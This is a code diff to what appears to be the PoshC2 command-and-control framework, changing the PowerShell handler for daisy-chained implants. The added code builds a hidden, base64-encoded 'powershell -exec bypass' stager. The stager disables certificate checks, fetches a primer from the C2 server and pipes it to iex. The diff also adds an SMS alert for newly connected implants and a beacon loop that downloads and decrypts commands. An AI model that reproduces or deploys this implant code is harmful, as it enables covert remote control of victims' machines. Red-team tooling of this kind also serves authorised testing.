@@ -836,8 +836,15 @@ while ($listener.IsListening)
         #
         ## add anti-ir and implant safety mechanisms here!
 
-        Write-Host "New Daisy chain implant connected: (uri=$randomuri, key=$key)" -ForegroundColor Green
-        Write-Host "$endpointip | PID:$im_pid | Sleep:$defaultbeacon | $im_computername $im_domain ($im_arch) "`n -ForegroundColor Green
+        $im_firstseen = $(Get-Date)
+        Write-Host "New Daisy host connected: (uri=$randomuri, key=$key)" -ForegroundColor Green
+        Write-Host "$endpointip | URL:$im_proxy | Time:$im_firstseen | PID:$im_pid | Sleep:$defaultbeacon | $im_computername $im_domain ($im_arch) "`n -ForegroundColor Green
+
+        # optional clockwork sms on new implant
+        if (($apikey) -and ($mobilenumber)){
+            (New-Object System.Net.Webclient).DownloadString("https://api.clockworksms.com/http/send.aspx?key=$apikey&to=$mobilenumber&from=PoshC2&content=$im_computername")|Out-Null
+        }
+
 
         if ($enablesound -eq "Yes") {
             try {
@@ -894,10 +901,28 @@ while ($listener.IsListening)
 
 $key="' + "$key"+'"
 $sleeptime = '+$defaultbeacon+'
-$payload = "' + "$payload"+'"
+
+$payloadclear = @"
+`$username = "$proxyuser"
+`$password = "$proxypassword"
+`$proxyurl = "$proxyurl"
+`$domainfrontheader = "$domfront"
+`$serverport = "$serverport"
+`$Server = "$Server"
+`$Serverclean = "$Serverclean"
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true}
+function Get-Webclient {${function:Get-Webclient}} function Primer {${function:primer}}
+`$primer = primer
+if (`$primer) {`$primer| iex} else {
+start-sleep 10
+primer | iex }
+"@
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($payloadclear)
+$payloadraw = "powershell -exec bypass -Noninteractive -windowstyle hidden -e "+[Convert]::ToBase64String($bytes)
+$payload = $payloadraw -replace "`n", ""
 
 function getimgdata($cmdoutput) {
-    $icoimage = "'+$imageArray[-1]+'","'+$imageArray[0]+'","'+$imageArray[1]+'"`,"'+$imageArray[2]+'","'+$imageArray[3]+'"
+    $icoimage = @("'+$imageArray[-1]+'","'+$imageArray[0]+'","'+$imageArray[1]+'","'+$imageArray[2]+'","'+$imageArray[3]+'")
     $image = $icoimage|get-random
 
     function randomgen 
@@ -1002,8 +1027,9 @@ function Decrypt-String2($key, $encryptedStringWithIV) {
 }
 [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
 $URI= "'+$randomuri+'"
-$Server = "$server/'+$randomuri+'"
 $ServerClean = $Server
+$Server = "$server/'+$randomuri+'"
+
 while($true)
 {
     $date = (Get-Date -Format "dd/MM/yyyy")
@@ -1017,7 +1043,7 @@ while($true)
     $URLS = '+$urlstring+'
     $RandomURI = Get-Random $URLS
     $Server = "$ServerClean/$RandomURI$URI"
-    $ReadCommand = (Get-Webclient).DownloadString("$Server")
+    try { $ReadCommand = (Get-Webclient).DownloadString("$Server") } catch {}
 
      while($ReadCommand) {
         $ReadCommandClear = Decrypt-String $key $ReadCommand
